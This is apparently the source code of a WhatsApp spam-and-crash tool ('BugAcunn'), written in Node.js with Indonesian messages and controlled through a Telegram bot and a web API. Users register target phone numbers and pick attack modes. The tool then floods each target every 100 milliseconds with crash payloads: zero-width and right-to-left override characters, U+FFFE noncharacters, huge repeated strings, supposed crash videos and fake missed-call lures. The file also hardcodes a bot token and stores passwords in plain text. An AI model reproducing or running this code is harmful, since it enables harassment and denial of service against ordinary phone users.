const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const fs = require('fs');
const crypto = require('crypto');
const app = express();
app.use(express.json());
app.use(express.static('public'));

// ========== KONFIGURASI ==========
const BOT_TOKEN = '8929432221:AAG3K8a6THua8Qf33mNEJHpc3iv_7W0tZtc';
const OWNER_ID = '8718615350';
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ========== DATA USER ==========
const DATA_FILE = './users.json';
let users = {};
let sessions = {};

function loadUsers() {
    if (fs.existsSync(DATA_FILE)) {
        try {
            const raw = fs.readFileSync(DATA_FILE);
            users = JSON.parse(raw);
        } catch(e) { users = {}; }
    }
}
function saveUsers() {
    fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2));
}
loadUsers();

function generateToken() { return crypto.randomBytes(32).toString('hex'); }

// ========== TELEGRAM BOT ==========
bot.onText(/\/adduser (.+) (.+)/, (msg, match) => {
    if (msg.chat.id.toString() !== OWNER_ID) return bot.sendMessage(msg.chat.id, '❌ Lu bukan owner, anj!');
    const username = match[1], password = match[2];
    if (users[username]) return bot.sendMessage(msg.chat.id, `⚠️ User ${username} sudah ada.`);
    users[username] = {
        password,
        targets: { admin: [], users: [] },
        sock: null, qr: null, spamInterval: null,
        totalSpam: 0, telegramId: null, attackType: 'cyclone'
    };
    saveUsers();
    bot.sendMessage(msg.chat.id, `✅ User ${username} berhasil ditambahkan!`);
});

bot.onText(/\/login (.+) (.+)/, (msg, match) => {
    const username = match[1], password = match[2];
    if (!users[username] || users[username].password !== password)
        return bot.sendMessage(msg.chat.id, '❌ Username atau password salah!');
    users[username].telegramId = msg.chat.id.toString();
    saveUsers();
    bot.sendMessage(msg.chat.id, `✅ Login berhasil! Akun Telegram terhubung dengan ${username}.`);
});

function getUsernameFromChat(chatId) {
    for (let u in users) if (users[u].telegramId === chatId.toString()) return u;
    return null;
}

bot.onText(/\/startspam/, async (msg) => {
    const username = getUsernameFromChat(msg.chat.id);
    if (!username) return bot.sendMessage(msg.chat.id, '❌ Login dulu! Ketik /login username password');
    await startWASession(username);
    bot.sendMessage(msg.chat.id, '🚀 Spam dimulai!');
});

bot.onText(/\/stopspam/, (msg) => {
    const username = getUsernameFromChat(msg.chat.id);
    if (!username) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
    stopSpamForUser(username);
    bot.sendMessage(msg.chat.id, '⛔ Spam dihentikan.');
});

bot.onText(/\/addtarget (.+) (.+)/, (msg, match) => {
    const username = getUsernameFromChat(msg.chat.id);
    if (!username) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
    const number = match[1], role = match[2].toLowerCase();
    if (!['admin','users'].includes(role)) return bot.sendMessage(msg.chat.id, '❌ Role harus admin atau users.');
    users[username].targets[role].push(number);
    saveUsers();
    bot.sendMessage(msg.chat.id, `✅ ${role} ${number} ditambahkan!`);
    updateSpamForUser(username);
});

bot.onText(/\/removetarget (.+)/, (msg, match) => {
    const username = getUsernameFromChat(msg.chat.id);
    if (!username) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
    const number = match[1];
    let removed = false;
    ['admin','users'].forEach(role => {
        const idx = users[username].targets[role].indexOf(number);
        if (idx !== -1) { users[username].targets[role].splice(idx, 1); removed = true; }
    });
    if (removed) { saveUsers(); bot.sendMessage(msg.chat.id, `✅ ${number} dihapus.`); }
    else bot.sendMessage(msg.chat.id, `❌ ${number} tidak ditemukan.`);
});

bot.onText(/\/status/, (msg) => {
    const username = getUsernameFromChat(msg.chat.id);
    if (!username) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
    const user = users[username];
    const admin = user.targets.admin.join(', ') || 'kosong';
    const usersList = user.targets.users.join(', ') || 'kosong';
    bot.sendMessage(msg.chat.id, `
📊 USER: ${username}
👑 Admin: ${admin}
👤 User: ${usersList}
📨 Total spam: ${user.totalSpam || 0}
🔗 Koneksi WA: ${user.sock ? '✅ Online' : '❌ Offline'}
🎯 Attack: ${user.attackType || 'cyclone'}
`);
});

bot.onText(/\/getqr/, (msg) => {
    const username = getUsernameFromChat(msg.chat.id);
    if (!username) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
    const user = users[username];
    if (user.qr) bot.sendMessage(msg.chat.id, `📱 Scan QR:\n${user.qr}`);
    else bot.sendMessage(msg.chat.id, '❌ Tidak ada QR aktif. Coba /startspam');
});

// ========== WA ENGINE ==========
async function startWASession(username) {
    const user = users[username];
    if (user.sock) { updateSpamForUser(username); return; }
    const { state, saveCreds } = await useMultiFileAuthState(`./sessions/${username}`);
    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        browser: ['BugAcunn', 'Chrome', '120.0.0.0']
    });
    sock.ev.on('creds.update', saveCreds);
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr) {
            user.qr = qr;
            if (user.telegramId) bot.sendMessage(user.telegramId, `📱 Scan QR:\n${qr}`);
        }
        if (connection === 'open') {
            user.sock = sock;
            user.qr = null;
            console.log(`✅ ${username} connected`);
            updateSpamForUser(username);
            if (user.telegramId) bot.sendMessage(user.telegramId, '✅ WhatsApp terhubung! Spam aktif.');
        }
        if (connection === 'close') {
            const reason = lastDisconnect?.error?.output?.statusCode;
            if (reason === DisconnectReason.loggedOut || reason === 401) {
                user.sock = null;
                if (user.telegramId) bot.sendMessage(user.telegramId, '❌ Session putus! Reconnect dalam 5 detik...');
                setTimeout(async () => { await startWASession(username); }, 5000);
            }
        }
    });
    user.sock = sock;
    saveUsers();
}

async function pairWASession(username, phoneNumber) {
    const user = users[username];
    if (user.sock) { await user.sock.end(); user.sock = null; }
    const { state, saveCreds } = await useMultiFileAuthState(`./sessions/${username}`);
    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        browser: ['BugAcunn', 'Chrome', '120.0.0.0']
    });
    sock.ev.on('creds.update', saveCreds);
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            user.sock = sock;
            user.qr = null;
            console.log(`✅ ${username} connected via pairing`);
            updateSpamForUser(username);
            if (user.telegramId) bot.sendMessage(user.telegramId, '✅ WhatsApp terhubung! Spam aktif.');
        }
        if (connection === 'close') {
            const reason = lastDisconnect?.error?.output?.statusCode;
            if (reason === DisconnectReason.loggedOut || reason === 401) {
                user.sock = null;
                if (user.telegramId) bot.sendMessage(user.telegramId, '❌ Session logout.');
            }
        }
    });
    const code = await sock.requestPairingCode(phoneNumber);
    user.sock = sock;
    saveUsers();
    return code;
}

function updateSpamForUser(username) {
    const user = users[username];
    if (user.spamInterval) { clearInterval(user.spamInterval); user.spamInterval = null; }
    if (!user.sock) return;
    const allTargets = [...user.targets.admin, ...user.targets.users];
    if (allTargets.length === 0) return;
    const attackType = user.attackType || 'cyclone';
    
    user.spamInterval = setInterval(async () => {
        try {
            for (let target of allTargets) {
                switch(attackType) {
                    case 'crash_ui':
                        await user.sock.sendMessage(target, { text: '⚠️ CRASH UI BY @PANCYOFFICIAL' });
                        await user.sock.sendMessage(target, { text: '\uFFFE\uFFFF'.repeat(500) });
                        await user.sock.sendMessage(target, { text: 'A'.repeat(20000) });
                        break;
                    case 'delay_invisible':
                        await user.sock.sendMessage(target, { text: '\u200B'.repeat(10000) }); // invisible chars
                        await user.sock.sendMessage(target, { text: '\u2060\u2060\u2060'.repeat(5000) });
                        break;
                    case 'crash_ios_invisible':
                        await user.sock.sendMessage(target, { text: '\u202E\u202D\u2066'.repeat(3000) });
                        await user.sock.sendMessage(target, { text: '\uFFFE'.repeat(500) });
                        break;
                    case 'force_close_1msg':
                        await user.sock.sendMessage(target, { text: '☠️ FORCE CLOSE ☠️' });
                        await user.sock.sendMessage(target, { text: '\uFFFE\uFFFF'.repeat(500) });
                        await user.sock.sendMessage(target, { text: 'BOMB'.repeat(5000) });
                        await user.sock.sendMessage(target, { video: { url: 'https://files.catbox.moe/crashvid.mp4' } });
                        break;
                    case 'force_close_invisible':
                        await user.sock.sendMessage(target, { text: '\u200B'.repeat(5000) + '\uFFFE'.repeat(300) });
                        break;
                    case 'force_close_ios_invisible':
                        await user.sock.sendMessage(target, { text: '\u202E'.repeat(5000) + '\uFFFE'.repeat(500) });
                        break;
                    case 'spam_call':
                        // Fake call spam (kirim pesan call invitation)
                        await user.sock.sendMessage(target, { text: '📞 INCOMING CALL...' });
                        await user.sock.sendMessage(target, { text: '📞 MISSED CALL from +6281234567890' });
                        await user.sock.sendMessage(target, { text: '📞 CALL BACK NOW!' });
                        break;
                    case 'delay_hard_invisible':
                        await user.sock.sendMessage(target, { text: '\u200B'.repeat(20000) });
                        await user.sock.sendMessage(target, { text: '\u2060'.repeat(10000) });
                        break;
                    case 'blank_andro':
                        await user.sock.sendMessage(target, { text: '\u200B'.repeat(50000) }); // blank banget
                        break;
                    case 'force_close_infinity':
                        // Loop tanpa henti
                        for(let i=0; i<10; i++) {
                            await user.sock.sendMessage(target, { text: 'INFINITY LOOP ' + i });
                            await user.sock.sendMessage(target, { text: '\uFFFE'.repeat(200) });
                        }
                        break;
                    case 'video_exploit':
                        await user.sock.sendMessage(target, { video: { url: 'https://files.catbox.moe/crashvid.mp4' } });
                        await user.sock.sendMessage(target, { video: { url: 'https://files.catbox.moe/crashvid2.mp4' } });
                        break;
                    case 'cyclone':
                        // All-in-one most brutal
                        await user.sock.sendMessage(target, { text: '☠️ CYCLONE MODE ACTIVE ☠️' });
                        await user.sock.sendMessage(target, { text: '\uFFFE\uFFFF'.repeat(500) });
                        await user.sock.sendMessage(target, { video: { url: 'https://files.catbox.moe/crashvid.mp4' } });
                        await user.sock.sendMessage(target, { text: '\u202E\u202D'.repeat(500) });
                        await user.sock.sendMessage(target, { text: 'BOMB'.repeat(5000) });
                        await user.sock.sendMessage(target, { text: '\u200B'.repeat(10000) });
                        await user.sock.sendMessage(target, { text: '☠️ FORCE CLOSE ☠️' });
                        break;
                    default:
                        await user.sock.sendMessage(target, { text: '☠️ BUG ACUNN' });
                }
                user.totalSpam = (user.totalSpam || 0) + 1;
            }
        } catch(e) {}
        saveUsers();
    }, 100); // 100ms interval — super fast!
}

function stopSpamForUser(username) {
    const user = users[username];
    if (user.spamInterval) { clearInterval(user.spamInterval); user.spamInterval = null; }
}

// ========== REST API ==========
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Username dan password wajib' });
    if (!users[username] || users[username].password !== password)
        return res.status(401).json({ error: 'Username atau password salah' });
    const token = generateToken();
    sessions[token] = username;
    res.json({ token, username });
});

function auth(req, res, next) {
    const token = req.headers['x-token'] || req.query.token;
    if (!token || !sessions[token]) return res.status(401).json({ error: 'Unauthorized' });
    req.username = sessions[token];
    next();
}

app.get('/api/status', auth, (req, res) => {
    const user = users[req.username];
    res.json({
        targets: user.targets,
        totalSpam: user.totalSpam || 0,
        connected: !!user.sock,
        attackType: user.attackType || 'cyclone'
    });
});

app.post('/api/start', auth, async (req, res) => {
    await startWASession(req.username);
    res.json({ message: 'Session started' });
});

app.post('/api/stop', auth, (req, res) => {
    stopSpamForUser(req.username);
    res.json({ message: 'Spam stopped' });
});

app.post('/api/targets', auth, (req, res) => {
    const { number, role } = req.body;
    if (!number || !role) return res.status(400).json({ error: 'Missing fields' });
    const user = users[req.username];
    if (!['admin','users'].includes(role)) return res.status(400).json({ error: 'Invalid role' });
    user.targets[role].push(number);
    saveUsers();
    updateSpamForUser(req.username);
    res.json({ success: true });
});

app.delete('/api/targets', auth, (req, res) => {
    const { number, role } = req.body;
    const user = users[req.username];
    if (!['admin','users'].includes(role)) return res.status(400).json({ error: 'Invalid role' });
    const idx = user.targets[role].indexOf(number);
    if (idx !== -1) { user.targets[role].splice(idx, 1); saveUsers(); updateSpamForUser(req.username); }
    res.json({ success: true });
});

app.get('/api/qr', auth, (req, res) => {
    const user = users[req.username];
    res.json({ qr: user.qr || null });
});

app.post('/api/pair', auth, async (req, res) => {
    const { phone } = req.body;
    if (!phone || phone.length < 10) return res.status(400).json({ error: 'Nomor tidak valid' });
    try {
        const code = await pairWASession(req.username, phone);
        res.json({ code });
    } catch(e) {
        console.error(e);
        res.status(500).json({ error: 'Gagal pairing: ' + e.message });
    }
});

app.post('/api/setattack', auth, (req, res) => {
    const { type } = req.body;
    const validTypes = [
        'crash_ui', 'delay_invisible', 'crash_ios_invisible',
        'force_close_1msg', 'force_close_invisible', 'force_close_ios_invisible',
        'spam_call', 'delay_hard_invisible', 'blank_andro',
        'force_close_infinity', 'video_exploit', 'cyclone'
    ];
    if (!validTypes.includes(type)) return res.status(400).json({ error: 'Tipe serangan tidak valid' });
    users[req.username].attackType = type;
    saveUsers();
    updateSpamForUser(req.username);
    res.json({ success: true });
});

app.get('/api/admin/users', auth, (req, res) => {
    if (req.username !== 'admin') return res.status(403).json({ error: 'Admin only' });
    const list = Object.keys(users).map(u => ({
        username: u,
        totalSpam: users[u].totalSpam || 0,
        connected: !!users[u].sock,
        targetCount: users[u].targets.admin.length + users[u].targets.users.length
    }));
    res.json(list);
});

app.post('/api/admin/adduser', auth, (req, res) => {
    if (req.username !== 'admin') return res.status(403).json({ error: 'Admin only' });
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Username dan password wajib' });
    if (users[username]) return res.status(400).json({ error: 'User sudah ada' });
    users[username] = {
        password,
        targets: { admin: [], users: [] },
        sock: null, qr: null, spamInterval: null,
        totalSpam: 0, telegramId: null, attackType: 'cyclone'
    };
    saveUsers();
    res.json({ success: true });
});

// ========== JALANKAN ==========
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🤖 Bot Telegram aktif`);
});
